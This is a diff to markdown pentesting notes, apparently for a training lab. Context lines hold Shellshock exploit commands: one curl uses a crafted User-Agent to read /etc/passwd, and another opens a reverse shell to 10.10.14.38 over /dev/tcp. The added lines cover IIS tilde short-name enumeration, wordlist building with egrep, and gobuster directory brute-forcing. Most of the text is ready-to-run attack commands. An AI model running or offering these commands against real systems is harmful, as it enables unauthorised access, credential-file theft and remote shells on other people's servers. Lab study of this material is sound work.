@@ -102,3 +102,25 @@ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' 
 ```
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
+
+
+# Miscellaneous Applications
+
+## IIS Tilde Enumeration
+
+### Tilde Enumeration using IIS ShortName Scanner
+
+[IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
+```
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+```
+
+### Generate Wordlist
+
+```
+egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
+```
+
+```
+gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
+```
